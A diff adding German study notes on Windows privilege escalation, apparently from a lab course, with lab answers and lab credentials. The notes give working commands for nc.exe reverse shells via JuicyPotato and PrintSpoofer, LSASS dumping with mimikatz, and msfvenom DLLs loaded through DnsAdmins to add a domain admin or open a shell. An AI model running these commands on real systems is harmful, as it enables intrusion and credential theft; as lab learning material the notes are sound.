@@ -1,0 +1,294 @@
+Windows Privilege Escalation
+
+Introduction
+1.Introduction to Windows Privilege Escalation: 
+- Wenn wir im System sind muessen wir mehr Privilegien bekommen um uns durch das System zu bewegen
+- Die hoechsten Rechte im System haben Local Administrators Gruppen und NT AUTHORITY\SYSTEM LocalSystem Account
+- Es gibt viele automatische Tools manchmal haben wir aber kein Zugriff auf diese Tools
+
+2. Useful Tools:
+- Es gibt viele automatische Tools wie:
+	- Seatbelt, winPEAS, PowerUp, SharUp, JAWS usw
+
+#########################################################################################
+Getting the Lay of the Land
+1. Situational Awareness:
+- Wir muessen als erstes Informationen ueber unsere Umgebung sammeln um unsere naehste Entscheidung zu planen
+
+- Network Information:
+	- Netzwerkinformationen sind sehr wichtig fuer die Enumeration
+	- Routing Tabellen geben uns wichtige Informationen ueber das Netzwerk
+	- Mit arp koennen wir den ARP Cache wissen 
+	- ipconfig /all
+		- Gibt alle Interfaces, DNS Informationen und IP-Adressen aus
+	- arp -a
+		- Gibt alle Informationen zum Adress Resolution Protocol(ARP) aus
+	- route print
+		- Gibt die Routingtabellen aus
+
+- Die meisten Firmen setzen anti-virus order Entpoint Detection und Response(EDR) ein
+- Diese Tools koennen den enumerierungs Prozesses beeinflussen
+- Die meisten verbieten Tools wie net.exe, tasklist usw
+- Microsoft hat dafuer ein Tool AppLocker, die Policie koennen wir mit dem CMDlet GetAppLockerPolicy ueberpruefen
+	- Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+	- Testen fuer cmd.exe
+	- Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
+
+- Question:
+- xfreerdp /v:10.129.43.43 /u:htb-student /p:'HTB_@cademy_stdnt!'
+1. arp -a
+2. Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+2. Initial Enumeration:
+- Wenn wir anfaenglichen Zugang zu einem System haben wollen wir Zugriff auf einen hoeheren User haben
+- Hoehere User sind NT AUTHORITY\SYSTEM Account oder den LocalSystem Account
+- Manchmal wird der administrator von den Unternehmen deaktiviert
+- Ein Standarduser der in der Adminstrator Group ist
+
+- Key Data Points:
+	- Os name: Den Typ des Windows Betriebssystem zu kennen wie Windows 7, Windows Server 2008 use
+	- Version: Die Version des Betriebssystem ist wichtig die um Exploits zu finden
+	- Running Services: Die Laufenden Prozesse zu kennen ist sehr wichtig
+
+- System Information:
+	- Wir koennen mit tasklist die aktuellen Prozesse finden
+	- Wichtige Standarddienste sind Local Security Subsystem Service(LSASS), WinLogon(winlogon.exe), Session Manager Subsystem(smss.exe)
+	- Ein weiterer Prozess ist MsMpEng.exe Windows Defender
+
+- Display All Enviroment Variables:
+	- Mit set koennen wir alle Umgebungsvariables ausgeben
+
+- View Detailed Configuration Information:
+	- Mit systeminfo koennen wir Informationen ueber das Betriebssytem bekommen
+	- Hier kann ausserdem gesehen werden ob das System eine VM ist
+	- Hier koennen wir auch die Hotfixes sehen um das System zu fixen
+
+- Patches and Updates:
+	- Wenn unter systeminfo keine Hotfixes dargestellt werden koennen wir mit wmic qfe in CMD die Updates darstellen 
+	- In PowerShell gibt es die Altenative Get-HotFix
+
+- Installed Programs:
+	- Mit wmic product get name koennen die installierten Programme ausgeben koennen
+	- In PowerShell koennen wir Get-WmiObject -Class Win32_Product verwenden
+
+- Display Running Processes:
+	- Mit netstat -ano koenen wir die laufenden Prozesse mit Port abfangen
+
+- User & Group Information:
+	- User sind meistens die beste Schwachstelle
+	- Manchmal haben wir Zugriff auf das Verzeichnis eines Adminstrators
+	
+	- Logged-In Users:
+		- Wir koennen die eingelotten User mit query user ausgeben
+
+	- Current User:
+		- Den derzeigten User koennen wir mit echo %USERNAME% ausgeben
+
+	- Current User Privileges:
+		- Mit whoami /priv koennen wir die derzeitigen Privilegien des Users ausgeben
+
+	- Current User Group Information:
+		- whoami /groups
+
+	- Get All Users:
+		- net user
+
+	- Get All Groups:
+		- net localgroup
+
+	- Details About a Group:
+		- net localgroup <Gruppenname>
+
+	- Get Password Policy & Other Account Information:
+		- net accounts
+
+- Question:
+xfreerdp /v:10.129. /u:htb-student /p:'HTB_@cademy_stdnt!'
+1. whoami /priv
+2. net localgroup "Backup Operators"
+3. netstat -ano
+	- PID 2260
+	- tasklist /svc
+4. query user
+5. query user
+
+3. Communication with Processes:
+- Durch Prozesse die auf dem System laufen koennen wir zusaeztliche Rechte bekommen
+
+- Access Tokens:
+	- Der User bekommt nach erfolgreichem Login ein Access Token zu geschrieben
+	- Dieser Token enthaelt die Useridentitaet, Gruppenmitgliedsschaft, Zugriffsrechte
+
+- Enumerating Network Services:
+	- Der haeufigste Weg mit Prozessen zu interargieren sind Network Socket(DNS, HTTP, SMB, usw.)
+	- Netstat wird alle aktiven TCP und UDP Verbindungen darstellen
+	- Wir koennen eventuell ein Service mit einer Schwachstelle erkennen den wir verwenden koennn um mehr Rechte zu bekommen
+		- netstat -ano
+
+- Named Pipes:
+	- Pipes sind ein Kommunikationsmittel mit der Anwendungen miteinandere kommunizieren koennen
+	- Pipes sind Dateien die im Speicher vorgehalten werden nach der Benutzung wird die Pipe gecleared
+	- Mit PipeList kann eine Liste an named Pipes ausgegeben werden
+	- In PowerShell kann die Liste von named Pipes mit gci \\.\pipe\ ausgegeben werden
+	
+	- Wir koennen Accesschk verwenden um die Rechte fuer einen named Pipe zu enumerieren
+	- accesschk.exe /accepteula \\.\Pipe\<Pipe_Name> -v
+	- Um die Rechte fuer alle Pipes auszugeben koennen wir .\accesschk.exe /accepteula \\.\Pipe\ verwenden
+
+- Question:
+1. netstat -ano 
+	- 2072
+	- tasklist /svc
+2. pipelist.exe /accepteula
+	- SQLLocal\SQLEXPRESS01
+	- .\accesschk.exe -accepteula -w \pipe\SQLLocal\SQLExpress01 -v
+
+#########################################################################################
+Windows User Privileges
+1. Windows Privileges Overview:
+- Privileges in Windows sind Rechte die einem Account Rechte geben Befehle auszufuehren
+- Privileges sind anderes als Zugriffsrechte, die dem User Zugang zu sicheren Objekten geben
+- Jedes mal wenn ein User ein Befehl ausfuehrt koennen wird der Access Token ueberprueft ob dieser User die Befehle ausfuehren kann
+
+- Windows Authorization Process:
+	- Security Principals ist alles was sich an einem System authentifizieren kann wie User, Computerkonten, Prozesse, Gruppen usw.
+	- Jeder Security Principal wird durch eine Security Identifier(SID) identifiziert
+	- Die Zugriffsrechte werden in einer Access Control Entries(ACEs) fuer jede Ressource festgehalten
+	- In ACEs sind Regeln enthalten die mit dem Access Token abgeglichen werden
+
+2. SeImpersonate and SeAssignPrimaryToken:
+- In Windows hat jeder Prozess ein Token der Informationen zum Account enthaelt
+- Die Token sind keine sicheren Objekte sie befinden sich im Speicher und koennen gebruteforced werden
+- Wenn wir SeImpersonate Rechte haben koennen wir uns als ein anderer User ausgeben
+
+- SeImpersonate - JuicyPotato:
+	- Wenn wir Zugriff auf einen mssql Server haben koennen wir mit JuicyPotato hoehere Rechte bekommen
+	- Mit xp_cmdshell erlauben wir das ausfuehren von Befehlen auf dem System mit enable_xp_cmdshell
+	- Mit xp_cmdshell <Befehl> koennen Befehle auf dem System ausgefuehrt werden
+	- Wir koennen JuicyPotato verwenden um eine Shell mit NT AUTHORITY\SYSTEM Shell zu bekommen
+	- xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+	- sudo nc -lnvp 8443
+
+- PrintSpoofer and RoguePotato:
+	- JuicyPotato funktioniert nicht fuer Systeme die juenger sind Windows Server 2019 und Windows 10 Build 1809
+	- Wenn JuicyPotato nicht funktioniert koennen PrintSpoofer und RoguePotato verwendet werden fuer Systeme
+	- xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
+
+Question:
+mssqlclient.py sql_dev@10.129.43.30 -windows-auth
+enable_xp_cmdshell
+xp_cmdshell whoami /priv
+xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.206 8443 -e cmd.exe" -t *
+sudo nc -lnvp 8443
+	- type c:\Users\Administrator\Desktop\SeImpersonate\flag.txt
+
+3. SeDebugPrivilege:
+- Um mit Troubleshooting zu unterstuetzen bekommen die meisten User die SeDebugPrivilege Rechte zugewiesen
+- Wir koennen hiermit Local Authority Subsystem Service(LSASS) dumpen und die Credentials der user bekommen
+	- procdump.exe -accepteula -ma lsass.exe lsass.dmp
+- Wir koennen im Task Manager ebenso die lsass.exe dumpen lassen in eine Datei
+- Mit mimikatz koennen wir den dump laden
+	- mimikatz.exe
+		- sekurlsa::minidump lsass.dmp
+		- sekurlsa::logonpassword
+
+- Remote Code Execution as SYSTEM:
+	- Wir koennen ein Child Process starten mit SYSTEM Rechten wenn die SeDebugPrivilege vorliegen
+	- Wir koennen mit tasklist in PowerShell die Prozesse anzeigen mit PID wir muessen uns einen PID raussuchen die mit SYSTEM Privilegien laufen
+		- tasklist
+	- Wir koennen ebenso in CMD mit Get-Process die Prozesse mit PID ausgeben
+	- https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1
+	- Wir koennen mit der Syntax eineBash erstellen:
+		- [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
+
+- Question:
+- .\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+- Mit mimikatz den Dump anzeigen lassen
+- .\mimikatz.exe
+	- privilege::debug
+	- sekurlsa::logonpasswords
+
+4. SeTakeOwnershipPrivilege:
+- SeTakeOwnershipPrivilege gibt dem User das Recht Eigentuemer eines secure object zu sein
+- Die meisten Service Accounts haben SeBackupPrivilege, SeRestorePrivilege oder SeSecurityPrivilege Rechte die genutzt werden koennen um mehr Privilegien zu bekommen
+- Wir koennen dies ausnutzen mit Tools wie https://github.com/FSecureLABS/SharpGPOAbuse
+
+- Leveraging the Privilege:
+	- Wenn wir die SeTakeOwnershipPrivilege nicht haben koennen wir diese mit dem einem Script einholen:
+		- https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
+		- Import-Module .\Enable-Privilege.ps1
+		- .\EnableAllTokenPrivs.ps1
+	- -ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+	- Checking File Ownership:
+		- cmd /c dir /q 'C:\Department Shares\Private\IT'
+	- Wir koennen mit takeown den Eigentuemer der Datei aendern
+		- https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown
+	- Confirming Ownership Changed:
+		- Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+	- Wir muessen uns noch Leserechte fuer diese Datei bekommen:
+		- icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+
+- Question:
+	-  Import-Module .\Enable-Privilege.ps1
+	- .\EnableAllTokenPrivs.ps1
+	- cmd /c dir /q 'C:\TakeOwn\'
+	- takeown /f 'C:\TakeOwn\flag.txt'
+	- icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
+	- cat C:\TakeOwn\flag.txt
+
+#####################################################################
+Windows Groups Privileges
+1. Windows Built-in Groups
+- Windows Server und vor allem Domain Controller haben built-in Groups
+- Viele dieser Gruppen haben spezielle Rechte
+
+- Backup Operators:
+	- Wir koennen mit whoami /groups die aktuellen zugehoerigen Gruppen aufzeigen
+	- Wenn wir Mitglied von Backup Operators sind haben wir SeBackup und SeRestore Rechte die wir ausnutzen koennen
+	- Mit whoami /priv koennen wir unsere Privilegien anzeigen lassen
+	- Mit Set-SeBackupPrivilege koennen wir das Privileg auf erlaubt setzen
+	- Hiermit koennen wir geschuetzte Dateien kopieren und dann lesen
+	- Copy-FileSeBackupPrivilege '<Kopierte_Datei>' <Zielort>
+
+- Robocopy:
+	- robocopy koennen wir 
+	- robocopy /B <Kopierte_Datei> <Zielort>
+
+- Frage:
+	- xfreerdp /v:10.129.224.117 /u:'svc_backup' /p:'HTB_@cademy_stdnt!'
+	- Copy-FileSeBackupPrivilege 'C:\Users\Administrator\Desktop\SeBackupPrivilege\flag.txt' .\Contract1.txt
+#####################################################################
+3. DnsAdmins:
+- Mitglieder der DnsAdmins haben Zugriff auf DNS Informationen
+- Der DNS Service laeuft als Gruppe NT AUTHORITY\SYSTEM
+
+- Leveraging DnsAdmins Access:
+	- msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+	- wget "http://<IP>:<Port>/adduser.dll" -outfile "adduser.dll"
+	- dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+	- Get-ADGroupMember -Identity DnsAdmins
+
+- Fragen:
+- xfreerdp /v:10.129.71.154 /u:netadm /p:'HTB_@cademy_stdnt!'
+
+- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.180 LPORT=9999 -f dll -o reverse.dll
+- nc -lvnp 9999
+
+- python3 -m http.server 7777
+- wget "http://10.10.15.180:7777/reverse.dll" -outfile "adduser.dll"
+
+#####################################################################
+5. Print Operators:
+- Print Operators sind eine weitere Gruppe
+- Die Gruppe verwaltet Rechte fuer Drucker
+- Die Gruppe hat SeLoadDriverPrivilege, SeLoadDriverPrivilege
+
+- Frage:
+	- wget "http://10.10.15.180:8000/EnableSeLoadDriverPrivilege.cpp" -outfile "EnableSeLoadDriverPrivilege.cpp"
+
+#####################################################################
+6. Server Operators:
+- 
+
+
+#####################################################################
